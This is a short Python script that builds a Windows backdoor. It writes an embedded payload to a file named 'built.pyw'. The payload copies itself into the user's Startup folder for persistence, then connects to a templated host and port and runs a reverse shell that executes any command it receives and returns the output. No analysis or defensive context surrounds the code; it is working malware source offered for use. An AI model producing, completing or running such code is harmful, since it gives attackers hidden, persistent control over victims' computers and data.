import os

payload = '''
import shutil
import socket
import os
import subprocess
import sys
import ctypes



current_file_path = os.path.realpath(__file__)
    
filename = os.path.basename(current_file_path)
    
startup_folder_path = os.path.expanduser('~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
    
destination_path = os.path.join(startup_folder_path, filename)
    
shutil.copy2(current_file_path, destination_path)


SERVER_HOST = '%host%'
SERVER_PORT = %port%
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
SEPARATOR = "<sep>"
    
# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))
    
    
# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())
    
    
while True:
    command = s.recv(BUFFER_SIZE).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":
        # cd command, change directory
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            # if operation is successful, empty message
            output = ""
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    s.send(message.encode())
s.close()

'''

file = open('built.pyw', 'a')

with open('built.pyw', 'r+') as file:
    file.truncate(0)

file = open('built.pyw', 'w')

file.write(payload)

os.close(0)